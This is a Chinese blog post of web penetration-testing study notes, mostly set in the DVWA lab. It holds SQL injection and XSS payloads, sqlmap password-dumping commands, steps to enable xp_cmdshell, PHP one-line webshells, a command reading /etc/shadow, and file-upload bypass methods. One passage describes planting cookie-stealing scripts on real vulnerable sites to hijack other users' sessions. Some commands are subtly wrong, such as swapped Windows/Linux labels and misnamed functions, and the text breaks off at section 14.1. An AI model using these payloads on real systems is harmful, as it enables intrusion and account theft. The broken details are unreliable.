
<!doctype html>














<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />















  
  
  <link href="/assets/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/assets/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/assets/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Shell,Dos,PHP,Mysql," />





  <link rel="alternate" href="/atom.xml" title="悠悠然" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico?v=5.1.1" />
















<meta name="description" content="网络安全学习笔记。">
<meta name="keywords" content="Shell, Dos, PHP, Mysql">
<meta property="og:type" content="article">
<meta property="og:title" content="网络安全笔记">
<meta property="og:url" content="http://localhost:4000/%E5%AE%89%E5%85%A8/2019/01/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">
<meta property="og:site_name" content="悠悠然">
<meta property="og:description" content="网络安全学习笔记。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://localhost:4000/assets/images/security/sqlinjection.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/shorturl.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/getinfo.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/laobin.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/cancelcheck.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/modname.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/uploadmime.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/uploadneirong.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/csrf.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/putscanner.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/httpoption.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/aspscript.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/putfile.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/filemove.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/caidao.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/caidaofile.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/nmap.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/use.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/setRhost.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/exploit.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/sysinfo.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/script.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/ncshell.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/cgishell.png">
<meta property="og:image" content="http://localhost:4000/assets/images/security/jbossjava.png">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="网络安全笔记">
<meta name="twitter:description" content="网络安全学习笔记。">
<meta name="twitter:image" content="http://localhost:4000/assets/images/security/sqlinjection.png">


<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Mist',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://localhost:4000/"/>





  <title>网络安全笔记 | 悠悠然</title>
  
















</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  

  <div class="container sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"> <div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">悠悠然</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

<div id="posts" class="posts-expand">
  
  

  

  
  
  

  <article class="post post-type- " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://localhost:4000/%E5%AE%89%E5%85%A8/2019/01/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="jsf">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/assets/images/logo.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="悠悠然">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
          
          
            网络安全笔记
          
        </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-10T00:00:00+08:00">
                2019-01-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/category/#/%E5%AE%89%E5%85%A8" itemprop="url" rel="index">
                    <span itemprop="name">安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          
            
                <div class="post-description">
                    网络安全学习笔记。
                </div>
            
          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
  
  












  <div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1"><span class="section-number-2">1</span> 网络攻防基本介绍</h2>
<div class="outline-text-2" id="text-1">
</div><div id="outline-container-sec-1-1" class="outline-3">
<h3 id="sec-1-1"><span class="section-number-3">1.1</span> 渗透测试分类</h3>
<div class="outline-text-3" id="text-1-1">
</div><div id="outline-container-sec-1-1-1" class="outline-4">
<h4 id="sec-1-1-1"><span class="section-number-4">1.1.1</span> 黑盒测试</h4>
<div class="outline-text-4" id="text-1-1-1">
<p>
黑盒测试也称为功能测试，它是通过测试来监测每个功能是否都能够正常使用，在测试中，将程序看作一个不能够打开的盒子，在完全不考虑程序内部结构和内部特性的情况下，在程序接口进行测试，它只检查程序是否按照需求规格说明的规定正常使用，程序是否能够适当的接受输入数据而产生正确的数输出信息。黑盒测试着眼于程序外部结构，不考虑内部结构，主要针对软件界面和软件功能进行测试。
</p>
</div>
</div>
<div id="outline-container-sec-1-1-2" class="outline-4">
<h4 id="sec-1-1-2"><span class="section-number-4">1.1.2</span> 白盒测试</h4>
<div class="outline-text-4" id="text-1-1-2">
<p>
白盒测试称为结构测试或逻辑驱动测试，是一种测试用例使用方法，它从程序的控制结构导出测试用例。
</p>
</div>
</div>
<div id="outline-container-sec-1-1-3" class="outline-4">
<h4 id="sec-1-1-3"><span class="section-number-4">1.1.3</span> 灰盒测试</h4>
<div class="outline-text-4" id="text-1-1-3">
<p>
灰盒测试是介于黑盒测试和白盒测试中间的一种测试，测试多用于集成测试阶段，不仅关注输入与输出的正确性，同时也关注程序的内部情况。
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2"><span class="section-number-2">2</span> 渗透测试</h2>
<div class="outline-text-2" id="text-2">
</div><div id="outline-container-sec-2-1" class="outline-3">
<h3 id="sec-2-1"><span class="section-number-3">2.1</span> 术语</h3>
<div class="outline-text-3" id="text-2-1">
<pre class="example">
扫描 
木马、病毒 
黑帽子、白帽子 
社会工程学 
钓鱼
poc、exploit
WebShell
DDoS
ARP攻击
0day
</pre>
</div>
</div>
<div id="outline-container-sec-2-2" class="outline-3">
<h3 id="sec-2-2"><span class="section-number-3">2.2</span> 常见攻击</h3>
<div class="outline-text-3" id="text-2-2">
<pre class="example">
web:xss,csrf,提权逻辑错误
DB:sql注入,漏洞利用系统层:DDOS,远程溢出(MS08-067,MS10-020),rootkit,0day
网络层:DDOS,ARP欺骗
</pre>
</div>
</div>
<div id="outline-container-sec-2-3" class="outline-3">
<h3 id="sec-2-3"><span class="section-number-3">2.3</span> 流程</h3>
<div class="outline-text-3" id="text-2-3">
<pre class="example">
信息收集-&gt;扫描探测-&gt;漏洞利用-&gt;通道控制-&gt;内网扩展-&gt;资料回传
</pre>
</div>
</div>
<div id="outline-container-sec-2-4" class="outline-3">
<h3 id="sec-2-4"><span class="section-number-3">2.4</span> HTTP协议抓包工具</h3>
<div class="outline-text-3" id="text-2-4">
<pre class="example">
Burp Suite
</pre>
</div>
</div>
</div>
<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3"><span class="section-number-2">3</span> Burp Suite使用</h2>
<div class="outline-text-2" id="text-3">
</div><div id="outline-container-sec-3-1" class="outline-3">
<h3 id="sec-3-1"><span class="section-number-3">3.1</span> Target</h3>
</div>
<div id="outline-container-sec-3-2" class="outline-3">
<h3 id="sec-3-2"><span class="section-number-3">3.2</span> Proxy</h3>
<div class="outline-text-3" id="text-3-2">
<p>
代理，正对目标主机进行数据转发及数据包抓取。
</p>
</div>
</div>
<div id="outline-container-sec-3-3" class="outline-3">
<h3 id="sec-3-3"><span class="section-number-3">3.3</span> Spider</h3>
<div class="outline-text-3" id="text-3-3">
<p>
爬虫，爬取网站信息。
</p>
</div>
</div>
<div id="outline-container-sec-3-4" class="outline-3">
<h3 id="sec-3-4"><span class="section-number-3">3.4</span> Scaner</h3>
<div class="outline-text-3" id="text-3-4">
<p>
漏洞扫描，查看网站中常见的可利用漏洞。
</p>
</div>
</div>
<div id="outline-container-sec-3-5" class="outline-3">
<h3 id="sec-3-5"><span class="section-number-3">3.5</span> Intruder</h3>
<div class="outline-text-3" id="text-3-5">
<p>
暴力破解流程:
</p>
<pre class="example">
1.打开数据包数据代理,在浏览器中打开网站登录界面,在Target中获取登录页面,发送至暴力模块.
2.在暴力模块中positions中清除所有标记,然后选择自己感兴趣的变量.
3.然后在暴力模块中选择payloads中选择所标记的变量及匹配方式.
4.导入准备好的字典文件,然后点击Start attack按钮进行暴力破解.
</pre>
</div>
</div>
</div>
<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4"><span class="section-number-2">4</span> HTTP协议</h2>
<div class="outline-text-2" id="text-4">
</div><div id="outline-container-sec-4-1" class="outline-3">
<h3 id="sec-4-1"><span class="section-number-3">4.1</span> http协议请求类型</h3>
<div class="outline-text-3" id="text-4-1">
<pre class="example">
GET：请求指定页面内信息，返回实体主体
POST：请求服务器所接受指定的文档作为对所标识的URl的新的从属实体
PUT：从客户端向服务器传送的数据取代指定的文档的内容
DELETE：请求服务器删除指定的内容
HEAD：只请求页面的首部
OPTIONS：允许客户端查看服务器的性能
</pre>
</div>
</div>
<div id="outline-container-sec-4-2" class="outline-3">
<h3 id="sec-4-2"><span class="section-number-3">4.2</span> http状态码</h3>
<div class="outline-text-3" id="text-4-2">
<pre class="example">
1xx-提供信息
2xx-请求被成功提交
3xx-客户端被重定向到其它资源
4xx-请求错误
5xx-服务器错误
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-5" class="outline-2">
<h2 id="sec-5"><span class="section-number-2">5</span> DVWA暴力破解</h2>
<div class="outline-text-2" id="text-5">
</div><div id="outline-container-sec-5-1" class="outline-3">
<h3 id="sec-5-1"><span class="section-number-3">5.1</span> 暴力破解定义</h3>
<div class="outline-text-3" id="text-5-1">
</div><div id="outline-container-sec-5-1-1" class="outline-4">
<h4 id="sec-5-1-1"><span class="section-number-4">5.1.1</span> 常见分类</h4>
<div class="outline-text-4" id="text-5-1-1">
<pre class="example">
1.本地程序类 本地游戏等(IDA、Uedit32、ollydbg反汇编)
2.远程服务类 OA系统等(利用密码字典,穷举法猜出用户口令)
3.MD5等加密串暴力破解
</pre>
</div>
</div>
<div id="outline-container-sec-5-1-2" class="outline-4">
<h4 id="sec-5-1-2"><span class="section-number-4">5.1.2</span> 暴力破解DVWA</h4>
<div class="outline-text-4" id="text-5-1-2">
<p>
在使用burp suite时可以根据http状态码,长度及返回信息中的关键字信息来确认是否暴力破解成功,然后使用匹配成功的帐号去登录系统.
</p>
</div>
</div>
<div id="outline-container-sec-5-1-3" class="outline-4">
<h4 id="sec-5-1-3"><span class="section-number-4">5.1.3</span> 万能密码</h4>
</div>
<div id="outline-container-sec-5-1-4" class="outline-4">
<h4 id="sec-5-1-4"><span class="section-number-4">5.1.4</span> sql注入破解密码</h4>
</div>
</div>
</div>

<div id="outline-container-sec-6" class="outline-2">
<h2 id="sec-6"><span class="section-number-2">6</span> SQL注入</h2>
<div class="outline-text-2" id="text-6">
</div><div id="outline-container-sec-6-1" class="outline-3">
<h3 id="sec-6-1"><span class="section-number-3">6.1</span> mysql修改密码</h3>
<div class="outline-text-3" id="text-6-1">
<pre class="example">
mysqladmin -u root -p password "123456"; //在操作系统中
update user set password=password("123456") where user='root'; //在数据库中
update user set authentication_string=password("123456") where user='root'; //在5.7及以上的版中使用

如果忘记密码时，则可以跳过权限检查，然后在执行上面mysql中的命令
service mysql stop
mysql_safe --skip-grant-table &amp;
执行修改后，重启服务即可
</pre>
</div>
</div>
<div id="outline-container-sec-6-2" class="outline-3">
<h3 id="sec-6-2"><span class="section-number-3">6.2</span> sql注入类型</h3>
<div class="outline-text-3" id="text-6-2">
<pre class="example">
按照提交方式 get post cookice
按照数据库类型：php+mysql asp+access jsp+oracle
sql注入分为显注和盲注联合注入 //
报错注入 //http://192.168.1.117/index2.php?name=admin'and (updatexml(1,concat(0x5e24,(select user()),0x5e24),1)) and '
整型参数，字符，字符须注意单引号闭合
</pre>
</div>
</div>
<div id="outline-container-sec-6-3" class="outline-3">
<h3 id="sec-6-3"><span class="section-number-3">6.3</span> 注入方式</h3>
<div class="outline-text-3" id="text-6-3">
<pre class="example">
手动注入利用sqlmap工具
</pre>
</div>
</div>
<div id="outline-container-sec-6-4" class="outline-3">
<h3 id="sec-6-4"><span class="section-number-3">6.4</span> sqlmap常用命令</h3>
<div class="outline-text-3" id="text-6-4">
<pre class="example">
sqlmap -u url --dbs //爆数据库
sqlmap -u url --current-user //爆当前用户
sqlmap -u url --user //查看用户权限
sqlmap -u url --tables -D 数据库 //爆表段
sqlmap -u url --columns -T 表段 -D 数据库 //爆字段
sqlmap -u url --dump -C 字段 -T 表段 -D 数据库 //猜解
</pre>
</div>
</div>
<div id="outline-container-sec-6-5" class="outline-3">
<h3 id="sec-6-5"><span class="section-number-3">6.5</span> 手动注入以DVWA为例</h3>
<div class="outline-text-3" id="text-6-5">
<pre class="example">
order by: 表序列
union select: 联合查询猜测当前数据库中表的个数：1' order by 3 # //当数目超过表个数之后数据库会返回错误信息
1' union select 1,version() # //查询数据库版本
1' union select 1,database() # //查询数据库名称
1' union select 1,user()# //查询用户
1' union select 1,password from users # //查询数据库中所有用户密码
1' union select user,password from users # //查询数据库中所有用户及密码，如下图
</pre>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/sqlinjection.png" alt="sqlinjection.png">
</p>
</div>
</div>
</div>
<div id="outline-container-sec-6-6" class="outline-3">
<h3 id="sec-6-6"><span class="section-number-3">6.6</span> SQLserver开启xp<sub>cmdshell功能</sub></h3>
<div class="outline-text-3" id="text-6-6">
<p>
首先，需要上传简单木马，可以通过菜刀连接到服务器，获取网站的配置文件中关于数据库帐号信息，
然后配置菜刀中数据库的相关参数，再执行如下命令之后就可以开启服务器中的shell功能，我们可以尝试执行一些系统的命令。
</p>
<pre class="example">
EXEC sp_configure 'show advanced options',1 RECONFIGURE  //打开数据库高级功能
EXEC sp_configure 'xp_cmdshell',1 RECONFIGURE //打开xp_cmdshell功能
exec master..xp_cmdshell "whoami" //执行命令
</pre>
</div>
</div>
<div id="outline-container-sec-6-7" class="outline-3">
<h3 id="sec-6-7"><span class="section-number-3">6.7</span> mysql数据库结构</h3>
<div class="outline-text-3" id="text-6-7">
<pre class="example">
information_schema
mysql 用户 权限等运行所需信息 mysql.user
load_file
load_data
secure_file_priv 5开始需设定这个值并且有高权限，file权限，读写绝对路径文件。
select [content] into file/dumpfile [path] //file会做特殊字符转移，dumpfile不会做转移
</pre>
</div>
</div>
</div>
<div id="outline-container-sec-7" class="outline-2">
<h2 id="sec-7"><span class="section-number-2">7</span> 文件包含</h2>
<div class="outline-text-2" id="text-7">
</div><div id="outline-container-sec-7-1" class="outline-3">
<h3 id="sec-7-1"><span class="section-number-3">7.1</span> php中常用四个文件包含函数</h3>
<div class="outline-text-3" id="text-7-1">
<pre class="example">
include()
include_once()
require()
require_once()
</pre>
<p>
包含类型分为本地包含和远程包含
</p>
<pre class="example">
本地包含：http://192.168.1.103/www/vulnerabilities/fi/?page=02.php
远程包含：http://192.168.1.103/www/vulnerabilities/fi/?page=http://192.168.1.103/php.ini
</pre>
</div>
</div>
<div id="outline-container-sec-7-2" class="outline-3">
<h3 id="sec-7-2"><span class="section-number-3">7.2</span> php伪协议</h3>
<div class="outline-text-3" id="text-7-2">
<pre class="example">
php://filter //例如：http://45.76.206.86:10000/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=file1.php
php://input
Zip://
Phar://
Rar://
</pre>
</div>
</div>
</div>
<div id="outline-container-sec-8" class="outline-2">
<h2 id="sec-8"><span class="section-number-2">8</span> XSS漏洞攻击</h2>
<div class="outline-text-2" id="text-8">
</div><div id="outline-container-sec-8-1" class="outline-3">
<h3 id="sec-8-1"><span class="section-number-3">8.1</span> xss反射型</h3>
<div class="outline-text-3" id="text-8-1">
<p>
手动测试
</p>
<pre class="example">
&lt;script&gt;alert(1)&lt;/script&gt; //反弹信息
"&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;
"onclick="alert(/xss/)&lt;/script&gt;
</pre>
</div>
</div>
<div id="outline-container-sec-8-2" class="outline-3">
<h3 id="sec-8-2"><span class="section-number-3">8.2</span> 同源策略</h3>
<div class="outline-text-3" id="text-8-2">
<pre class="example">
同协议 http https
同域名同协议
X-Frame-Option DENY //不允许嵌入iframe标签
</pre>
</div>
</div>
<div id="outline-container-sec-8-3" class="outline-3">
<h3 id="sec-8-3"><span class="section-number-3">8.3</span> xss存储型攻击</h3>
<div class="outline-text-3" id="text-8-3">
<p>
存储在数据库中，当页面每次加载数据库中的信息时，将之前插入数据库中的javascript语句进行执行并展示给用户。
首先找一个有xss漏洞的网站，在XSS平台上注册一个帐号，生成一个攻击模板，然后使用这个模板的短网址复制到输入框中，将这个连接提交存储到数据库中，成功之后，用户每次访问数据库中的这条数据时，就会将用户的cookie信息上传到服务器中，这样我们使用上传的地址及cookie信息登录到系统中。
</p>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/shorturl.png" alt="shorturl.png">
</p>
<p><span class="figure-number">Figure 2:</span> 在xss平台生成模板得到短地址</p>
</div>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/getinfo.png" alt="getinfo.png">
</p>
<p><span class="figure-number">Figure 3:</span> 查看获取的信息</p>
</div>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/laobin.png" alt="laobin.png">
</p>
<p><span class="figure-number">Figure 4:</span> 使用老兵进行系统登录</p>
</div>

<p>
当自己有服务器时，我们可以在自己的服务器上放一个攻击脚本及信息收集脚本，然后，在其它有xss
漏洞的网站上上传我们的服务器脚本连接至数据库中，这样当正常用户访问页面时，加载我们的连接脚本后，可以将用户的cookie及浏览url等信息上传至我们的服务器中，我们可以根据此信息，在浏览器中使用插件，将自身的cookie修改问其他正常用户的cookie信息，这样我们就可以达到，使用他人信息登录网站的目地。
</p>
</div>
</div>

<div id="outline-container-sec-8-4" class="outline-3">
<h3 id="sec-8-4"><span class="section-number-3">8.4</span> DOM型xss攻击</h3>
<div class="outline-text-3" id="text-8-4">
<pre class="example">
\\x3Cscript\\x3Ealert(document.domain)\\x3CScript\\x3E
\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
</pre>
</div>
</div>
<div id="outline-container-sec-8-5" class="outline-3">
<h3 id="sec-8-5"><span class="section-number-3">8.5</span> php防御</h3>
<div class="outline-text-3" id="text-8-5">
<pre class="example">
htmlentities($input) //输出原有字符，不出现弹窗

&lt;?php
$input=$_GET['input'];
echo $input; //直接输入alert即可

&lt;?php
$input=$_GET['input'];
echo htmlentities($input); //无法注入

&lt;?php$input=$_GET['input'];
echo '&lt; img src='.htmlentities($input).'&gt;';  //input=123 onclick=alert(123)

&lt;?php$input=$_GET['input'];
$input=str_replace('=','',$input);
echo '&lt; img src='.$input.'&gt;'; //?input=w&gt;&lt;script&gt;alert(123)&lt;/script&gt;

&lt;?php
$input=$_GET['input'];
//$input=str_replace(' ','',$input);
$input=str_replace('=','',$input);
echo '&lt; img src='.htmlentities($input).'&gt;'; //无法注入

DOM型XSS
&lt;?php
$input=$_GET['input'];
$input=str_replace('=','',$input);
echo '&lt;script&gt;var a="'.htmlentities($input).'";document.write(a);&lt;/script&gt;';
//?input=\x3Cscript\x3Ealert(1234565)\x3C/script\x3E可以绕过防御
</pre>
</div>
</div>
</div>
<div id="outline-container-sec-9" class="outline-2">
<h2 id="sec-9"><span class="section-number-2">9</span> 文件上传漏洞攻击</h2>
<div class="outline-text-2" id="text-9">
</div><div id="outline-container-sec-9-1" class="outline-3">
<h3 id="sec-9-1"><span class="section-number-3">9.1</span> 文件上传JS验证</h3>
<div class="outline-text-3" id="text-9-1">
<p>
1、在点击上传文件之前，首先F12打开源代码文件，将上传按钮中关于上传文件格式检查的函数取消，
这样可以绕过文件类检查，将目标文件上传至网站中。
</p>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/cancelcheck.png" alt="cancelcheck.png">
</p>
<p><span class="figure-number">Figure 5:</span> 取消文件名称检查</p>
</div>

<p>
2、将可利用的代码写至图片文件中，依然使用图片文件后缀名文件进行上传文件，在点击上传的同时开启burp suite进行数据抓包操作，将抓到的数据包中将文件名的后缀改成php等服务器可以识别的文件名，这样就可以使用菜刀等软件实现攻击网站的目地。
</p>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/modname.png" alt="modname.png">
</p>
<p><span class="figure-number">Figure 6:</span> 使用ubrp suite进行文件名称修改</p>
</div>

<p>
3、将可利用代码写至图片中的方法
</p>
<pre class="example">
cat caidao.php &gt;&gt; caidao.jpg //Windows
copy /b caidao.php+caidao.jpg caidao.jpg //Linux
</pre>
</div>
</div>

<div id="outline-container-sec-9-2" class="outline-3">
<h3 id="sec-9-2"><span class="section-number-3">9.2</span> 文件上传MIME验证</h3>
<div class="outline-text-3" id="text-9-2">
<p>
修改数据包中Content-Type的值，修改为网站允许的类型后就可以上传文件，对应php中$<sub>file[]的值。</sub>
</p>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/uploadmime.png" alt="uploadmime.png">
</p>
<p><span class="figure-number">Figure 7:</span> 修改Content-Type值</p>
</div>
</div>
</div>

<div id="outline-container-sec-9-3" class="outline-3">
<h3 id="sec-9-3"><span class="section-number-3">9.3</span> 服务端扩展名验证</h3>
<div class="outline-text-3" id="text-9-3">
<p>
1、将后缀名进行大小写更改进行尝试
2、将后缀名添加其它字符进行上传尝试，如:file.php1
3、白名单无法绕过，Php phtml php3 php5 php7
4、黑名单，php phtml php5 (.user.ini .htaccess配置文件，改变服务器对文件解析方式，任意文件包含，更改后实时生效）auto<sub>append</sub><sub>file包含在文件头部，auto</sub><sub>prepend</sub><sub>file包含在文件结尾</sub>
5、将文件后缀名称之后添加"点空格[. ]"这样可以绕使用windows文件系统特性绕过安全检查
</p>
</div>
</div>
<div id="outline-container-sec-9-4" class="outline-3">
<h3 id="sec-9-4"><span class="section-number-3">9.4</span> 文件内容更改</h3>
<div class="outline-text-3" id="text-9-4">
<p>
在文件名称及文件类型正常的情况下，我们可以更改文件中的内容从而绕过服务器对上传文件的验证。
将脚本文件中内容追加到图片中，服务器在验证图片信息时仅仅查看文件的头部信息，对其后面的数据信息并不进行判断，应此我们可以使用此方法将可执行代码上传至服务器。
</p>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/uploadneirong.png" alt="uploadneirong.png"> 
</p>
<p><span class="figure-number">Figure 8:</span> 更改文件中内容</p>
</div>
</div>
</div>
</div>

<div id="outline-container-sec-10" class="outline-2">
<h2 id="sec-10"><span class="section-number-2">10</span> CSRF攻击</h2>
<div class="outline-text-2" id="text-10">
<p>
根据用户修改页面的源码生成一个csrf脚本，当用户点击这个新生成的脚本时，就可以在数据库中更改密码。
</p>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/csrf.png" alt="csrf.png">
</p>
<p><span class="figure-number">Figure 9:</span> csrf攻击脚本</p>
</div>
</div>
</div>

<div id="outline-container-sec-11" class="outline-2">
<h2 id="sec-11"><span class="section-number-2">11</span> SSRF</h2>
<div class="outline-text-2" id="text-11">
</div><div id="outline-container-sec-11-1" class="outline-3">
<h3 id="sec-11-1"><span class="section-number-3">11.1</span> php</h3>
<div class="outline-text-3" id="text-11-1">
<pre class="example">
url_init()
http:://[address]
file://[127.0.0.1]/etc/passwd
gopher://   --redis 未授权访问
dict://127.0.0.1:22  探测端口号
parse_url:使用file绕过parse_url
</pre>
</div>
</div>
</div>
<div id="outline-container-sec-12" class="outline-2">
<h2 id="sec-12"><span class="section-number-2">12</span> 攻防</h2>
<div class="outline-text-2" id="text-12">
<p>
一、防护
1、修改已知帐号密码，数据库，windows管理员密码
2、尽快发现自己的一些漏洞、木马、备份文件，系统安装文件、危险端口如445
3、实时关注常用服务日志二、攻击
1、扫描端口、寻找敏感端口，nmap、御剑2014
2、扫描网站目录，使用御剑
3、爆破常用服务(21,22,3389.3306,1433)
</p>
</div>
</div>
<div id="outline-container-sec-13" class="outline-2">
<h2 id="sec-13"><span class="section-number-2">13</span> php相关</h2>
<div class="outline-text-2" id="text-13">
</div><div id="outline-container-sec-13-1" class="outline-3">
<h3 id="sec-13-1"><span class="section-number-3">13.1</span> 回调函数</h3>
<div class="outline-text-3" id="text-13-1">
<pre class="example">
call_user_function('system','ls')
system exec shell_exec passthru popen pcntl_exec
</pre>
</div>
</div>
<div id="outline-container-sec-13-2" class="outline-3">
<h3 id="sec-13-2"><span class="section-number-3">13.2</span> php脚本函数执行</h3>
<div class="outline-text-3" id="text-13-2">
<pre class="example">
&lt;?php  
$a='a';
$b='b';
$c="$a+${$b}";
$e=phpinfo();
$h=system('cat /etc/shadow');
$f="${${system('ls /tmp')}}"
$d="${${phpinfo()}}";
echo $c;
?&gt;
</pre>
</div>
</div>
<div id="outline-container-sec-13-3" class="outline-3">
<h3 id="sec-13-3"><span class="section-number-3">13.3</span> 一句话木马</h3>
<div class="outline-text-3" id="text-13-3">
<pre class="example">
assert($_GET[pass]); //?pass=system('ls')
$_GET[a](S_GET[b]); //?a=assert&amp;b=phpinfo() ?a=system&amp;b=ls
$s=$_GET['a']; eval("\a = \"$a\";");
call_user_function($_GET[a],$_GET[b]); 回调函数
</pre>
</div>
</div>
</div>
<div id="outline-container-sec-14" class="outline-2">
<h2 id="sec-14"><span class="section-number-2">14</span> JAVA</h2>
<div class="outline-text-2" id="text-14">
</div><div id="outline-container-sec-14-1" class="outline-3">
<h3 id="sec-14-1"><span class="section-number-3">14.1</span> 备份</h3>
<div class="outline-text-3" id="text-14-1">
